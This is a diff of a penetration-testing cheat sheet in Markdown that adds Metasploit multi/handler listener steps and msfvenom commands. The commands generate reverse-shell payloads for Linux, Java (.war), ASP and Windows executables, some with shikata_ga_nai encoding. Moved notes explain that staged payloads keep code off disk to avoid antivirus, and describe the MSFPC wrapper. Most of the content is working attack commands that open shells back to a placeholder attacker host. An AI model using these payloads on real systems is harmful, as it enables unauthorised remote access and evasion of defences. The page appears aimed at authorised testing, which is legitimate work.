@@ -2,7 +2,72 @@
 
 ## Examples
 
+### Metasploit Multi-handler
+
+Start Metasploit:
+
+    msfconsole
+
+Set multi handler module:
+
+    use exploit/multi/handler
+
+Set up a shell:
+
+    set payload windows/x64/shell/reverse_tcp
+    set payload windows/shell/reverse_tcp
+    set payload windows/meterpreter/reverse_tcp
+    set payload linux/x64/shell/reverse_tcp
+    set payload linux/x86/shell/reverse_tcp
+    set payload java/jsp_shell_reverse_tcp
+
+Set options:
+
+    set LHOST <IP address attack machine>
+
+Start:
+
+    run
+
 ### MSFvenom
+
+Buffer overflow code for Linux with bad characters in C:
+
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
+
+Linux payload for `bash`:
+
+    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 CMD=/bin/bash -f js_le -e generic/none
+
+Java payload to a `.war` file:
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -f war > shell.war
+
+Microsoft Windows `asp` reverse shell:
+
+    msfvenom -p windows/shell_reverse_tcp -f asp LHOST=<attacking-ipaddress> LPORT=4444 -o shell.asp
+
+Windows executable reverse shell:
+
+    msfvenom -p windows/shell/reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -e x86/shikata_ga_nai X > shell.exe
+
+## Notes
+
+### MSFvenom
+
+MSFvenom is the one-stop-shop for all things payload related. The standard syntax for `msfvenom`:
+
+    msfvenom -p <PAYLOAD> <OPTIONS>
+
+* Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is 
+executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any 
+reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, 
+executing it directly and preventing it from touching the disk where it could be caught by traditional antivirus 
+solutions. Thus, the payload is split into two parts -- a small initial stager, then the bulkier reverse shell 
+code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the 
+Metasploit `multi/handler`.
+* Stageless payloads are more common. They are entirely self-contained in that there is one piece of code which, 
+when executed, sends a shell back immediately to the waiting listener.
 
 #### Stageless
 
@@ -21,7 +86,20 @@ To generate a Windows x64 Reverse Shell in an `.exe` format:
 
     msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP address attack machine> LPORT=<port-number>
 
-### MSFPC
+### MSFvenom payload creator
+
+MSFvenom Payload Creator (MSFPC) is a wrapper to generate multiple types of payloads, based on users choice. 
+The idea is to be as simple as possible (only requiring one input) to produce their payload.
+
+    $ msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>)
+    (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>)
+    (<VERBOSE>)
+
+* TYPE is the `-f` switch in msfvenom
+* DOMAIN/IP is the LHOST option
+* PORT is the LPORT option
+* CMD/MSF is the type of shell dropped once the payload is executed on the target system.
+* BATCH/LOOP to generate multiple payloads (multiple OS platforms) with a single command.
 
 #### Drop cmd windows
 
@@ -47,39 +125,6 @@ The associated resource file can be executed with:
 When the payload is executed, the stager will request for other parts of the payload to be
 sent over to the target server. These parts of the payload will be sent by payload handler
 and the complete staged payload is delivered to the victim machine.
-
-## Notes
-
-### MSFvenom
-
-MSFvenom is the one-stop-shop for all things payload related. The standard syntax for `msfvenom`:
-
-    msfvenom -p <PAYLOAD> <OPTIONS>
-
-* Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is 
-executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any 
-reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, 
-executing it directly and preventing it from touching the disk where it could be caught by traditional antivirus 
-solutions. Thus, the payload is split into two parts -- a small initial stager, then the bulkier reverse shell 
-code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the 
-Metasploit `multi/handler`.
-* Stageless payloads are more common. They are entirely self-contained in that there is one piece of code which, 
-when executed, sends a shell back immediately to the waiting listener.
-
-### MSFvenom payload creator
-
-MSFvenom Payload Creator (MSFPC) is a wrapper to generate multiple types of payloads, based on users choice. 
-The idea is to be as simple as possible (only requiring one input) to produce their payload.
-
-    $ msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>)
-    (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>)
-    (<VERBOSE>)
-
-* TYPE is the `-f` switch in msfvenom
-* DOMAIN/IP is the LHOST option
-* PORT is the LPORT option
-* CMD/MSF is the type of shell dropped once the payload is executed on the target system.
-* BATCH/LOOP to generate multiple payloads (multiple OS platforms) with a single command.
 
 ### Meterpreter shells
 
